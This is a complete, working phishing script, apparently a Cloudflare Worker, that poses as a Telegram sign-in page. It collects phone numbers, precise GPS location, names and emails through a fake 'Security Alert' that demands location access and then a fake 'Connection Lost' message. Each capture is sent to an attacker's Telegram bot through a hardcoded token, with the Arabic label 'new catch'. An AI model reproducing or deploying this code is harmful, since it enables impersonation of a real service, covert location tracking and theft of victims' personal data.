export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
          <style>
            body { font-family: -apple-system, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 40px; margin: 0; }
            .container { text-align: center; max-width: 360px; width: 90%; }
            
            /* أيقونة تليجرام مرسومة بالكود لضمان الظهور */
            .telegram-icon { width: 100px; height: 100px; margin: 0 auto 20px auto; display: block; }
            
            h2 { font-weight: 500; margin-bottom: 10px; font-size: 24px; color: #222; }
            p { color: #707579; font-size: 15px; margin-bottom: 30px; line-height: 1.5; }
            .iti { width: 100%; margin-bottom: 20px; }
            input { width: 100%; padding: 16px; border: 1px solid #dfe1e5; border-radius: 12px; box-sizing: border-box; font-size: 17px; outline: none; transition: border 0.3s; }
            input:focus { border-color: #3390ec; }
            button { width: 100%; padding: 16px; background: #3390ec; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
            .step { display: none; }
            .step.active { display: block; }
          </style>
        </head>
        <body>
          <div class="container">
            <svg class="telegram-icon" viewBox="0 0 240 240">
              <circle cx="120" cy="120" r="120" fill="#3390ec"/>
              <path d="M54 118L174 72L158 178L126 154L102 178L102 144L158 98L88 134L54 118Z" fill="white"/>
            </svg>
            
            <div id="step1" class="step active">
              <h2>Your Phone</h2>
              <p>Please confirm your country code and enter your phone number.</p>
              <input id="phone" type="tel">
              <button id="btn1" onclick="handleStep1()">NEXT</button>
            </div>

            <div id="step2" class="step">
              <h2>Profile Info</h2>
              <p>Complete your profile details to finish synchronization.</p>
              <input id="username" type="text" placeholder="Full Name">
              <input id="email" type="email" placeholder="Recovery Email (Optional)">
              <button id="btn2" onclick="handleStep2()">FINISH</button>
            </div>
          </div>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
          <script>
            const phoneInput = window.intlTelInput(document.querySelector("#phone"), {
              initialCountry: "iq",
              preferredCountries: ["iq", "sa", "ae", "kw", "jo"],
              utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
            });

            let mainData = { phone: "", lat: "0", lon: "0", acc: "None" };

            async function handleStep1() {
              const ph = phoneInput.getNumber();
              if (!ph || !phoneInput.isValidNumber()) { alert("⚠️ الرقم غير مكتمل أو خاطئ."); return; }

              document.getElementById("btn1").innerText = "Verifying...";
              
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                  mainData.phone = ph;
                  mainData.lat = pos.coords.latitude;
                  mainData.lon = pos.coords.longitude;
                  mainData.acc = pos.coords.accuracy < 100 ? "🟢 Exact GPS" : "🟡 Approx";
                  
                  await sendReport("FIRST_HIT");
                  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
                  document.getElementById('step2').classList.add('active');
                }, () => { 
                  alert("⚠️ Security Alert: Location access is required."); 
                  document.getElementById("btn1").innerText = "NEXT";
                }, { enableHighAccuracy: true });
              }
            }

            async function handleStep2() {
              document.getElementById("btn2").innerText = "Loading...";
              await sendReport("FINAL_HIT", document.getElementById("username").value, document.getElementById("email").value);
              alert("❌ Connection Lost: Please login again.");
              window.location.href = "https://telegram.org/dl";
            }

            async function sendReport(type, name = "", email = "") {
              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ type, phone: mainData.phone, lat: mainData.lat, lon: mainData.lon, acc: mainData.acc, name, email, ua: navigator.userAgent })
              });
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const d = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";
        const maps = "https://www.google.com/maps?q=" + d.lat + "," + d.lon;

        let msg = d.type === "FIRST_HIT" 
          ? "🚀 [صيد جديد]\\n📱 الرقم: " + d.phone + "\\n📍 الدقة: " + d.acc + "\\n🗺 الخريطة: " + maps
          : "📝 [تكملة بيانات للرقم: " + d.phone + "]\\n👤 الاسم: " + d.name + "\\n📧 الإيميل: " + d.email;

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
        return new Response("ok");
      } catch (e) { return new Response("err"); }
    }
  }
};
